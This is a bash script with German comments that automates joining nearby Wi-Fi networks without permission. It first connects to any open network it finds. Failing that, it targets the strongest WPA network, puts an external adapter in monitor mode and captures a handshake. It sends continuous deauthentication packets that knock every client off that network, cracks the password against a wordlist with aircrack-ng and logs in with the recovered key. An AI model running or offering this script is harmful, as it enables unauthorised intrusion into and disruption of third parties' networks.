#!/bin/bash

trap '{ systemctl start NetworkManager>> /home/auto_mode/logs/con.log; airmon-ng stop wlan1>> /home/auto_mode/logs/con.log; exit -9; }' SIGINT SIGTERM SIGQUIT SIGTSTP


echo "Attempting to connect to a network"> /home/auto_mode/logs/con.log


#################################################################################################################
# Offene Netzwerke
#################################################################################################################

# Wenn das Gerät nicht mit einem Netzwerk verbunden ist, suche ein offenes Netzwerk und verbinde wenn möglich
echo "Trying to connect to the first open wifi network...">> /home/auto_mode/logs/con.log
#Suche nach Netzwerken ohne Security Einstellung, und finde die dazugehörige SSID
open_wifi=$(nmcli -f SECURITY,SSID dev wifi | awk '/^--/' | cut -d ' ' -f2- | awk '{$1=$1}; 1' | head -n 1)
#Wird eine gültige SSID gefunden wird verbunden
if [[ -n "$open_wifi"  &&  "$open_wifi" != "--" ]]; then
    nmcli device wifi connect "$open_wifi">> /home/auto_mode/logs/con.log
    echo "Connected to open WiFi network: $open_wifi">> /home/auto_mode/logs/con.log
    exit 0
else
    echo "No open WiFi network found.">> /home/auto_mode/logs/con.log
fi

#################################################################################################################
# WPA Verschlüsselte Netzwerke
#################################################################################################################

# Um WPA Verschlüsselung zu knacken muss der externe Adapter angeschlossen sein
if [[ "$(ip link show wlan1)" == 'Device "wlan1" does not exist.' ]]; then
    echo "No external WiFi Adapter found.">> /home/auto_mode/logs/con.log
    echo "Could not connect to wireless network.">> /home/auto_mode/logs/con.log
    exit -5
fi


# Es wird maximal 60 Minuten lang nach einem Netzwerk gesucht
timeout=3600
start_time=$(date +%s)

while true; do
    #Die MAC Adresse des WLANs mit dem stärksten Signal wird gespeichert
    wifi_BSSID=$(nmcli -f BSSID dev wifi | sed -n '2p' | tr -d ' ')

    if [[ -n $wifi_BSSID ]]; then
        echo "The Network with the BSSID $wifi_BSSID is being tested..">> /home/auto_mode/logs/con.log 
        break
    else 
        sleep 5
    fi

    #timeout check
    current_time=$(date +%s)
    spent_time=$((current_time-start_time))
    if [ $spent_time -ge $timeout ]; then
        echo "No wireless network in reach. Exiting...">> /home/auto_mode/logs/con.log
        exit -4
    fi
done



#Prozesse die zu Problemen führen könnten werden beendet
airmon-ng check kill>> /home/auto_mode/logs/con.log
#Monitor mode wird aktiviert für die externe W-LAN Karte
airmon-ng start wlan1>> /home/auto_mode/logs/con.log
# Kanal auf dem das WLAN operiert wird herausgefiltert 
airodump-ng -w /tmp/wlan --output-format csv --write-interval 1 wlan1>/dev/null &
PID=$!

sleep 1

#3 Versuche den Kanal zu filtern bevor abgebrochen wird
for ((i = 1; i<= 3; i++)); do 
    ch=$(cat /tmp/wlan* | awk -v var="$wifi_BSSID" 'index($0, var) { gsub(",", ""); print $6 } ' | head -n 1)
    if [[ $ch =~ ^[0-9]+$ ]]; then
        echo "WLAN is operating on channel $ch">> /home/auto_mode/logs/con.log
        break
    else
        if [[ $i == 3 ]]; then
            echo "Unable to find channel">> /home/auto_mode/logs/con.log
            exit -3
        fi
        sleep 3
    fi
done


rm /tmp/wlan*
kill -TERM $PID


#Hier wird versucht einen 4-Way Handshake zu capturen
echo "Trying to capture handshake...">> /home/auto_mode/logs/con.log
airodump-ng -w ./aircrack/handshake --write-interval 1 -c $ch --bssid $wifi_BSSID wlan1>/dev/null &
PID=$!

# Deauth Packet wird an alle Geräte im Netzwerk geschickt
aireplay-ng --deauth 0 -a $wifi_BSSID wlan1>/dev/null &
PID2=$!

sleep 1

#Das jüngste .cap file wird gesucht
newest_cap=$(ls /home/pi/aircrack | grep '\.cap$' | sort -t '-' -k2 -n | tail -n 1)

#Es wird maximal 8 Std nach einem Handshake gesucht. 
timeout=28800
start_time=$(date +%s)

while true; do
    if aircrack-ng aircrack/$newest_cap | grep -qE "[1-9] handshake"; then
        pass=$(aircrack-ng -w /usr/share/wordlists/wifi.txt -b $wifi_BSSID aircrack/$newest_cap | awk '/KEY FOUND!/ {print $4}' | head -n 1) 
        break
    else
        sleep 2
    fi

    #timeout check
    current_time=$(date +%s)
    spent_time=$((current_time-start_time))
    if [ $spent_time -ge $timeout ]; then
        echo "Handshake could not be obtained. Exiting...">> /home/auto_mode/logs/con.log
        exit -2
    fi
done

kill -TERM $PID
kill -TERM $PID2

airmon-ng stop wlan1>> /home/auto_mode/logs/con.log
systemctl start NetworkManager>> /home/auto_mode/logs/con.log

if [ -n $pass ]; then
    echo "Password found in $newest_cap! (pass: $pass) Connecting to network!">> /home/auto_mode/logs/con.log
    nmcli dev wifi connect $wifi_BSSID password "$pass">> /home/auto_mode/logs/con.log
    exit 0
else
    echo "Unable to find password for WIFI AP. Exiting...">> /home/auto_mode/logs/con.log
    exit -1
fi
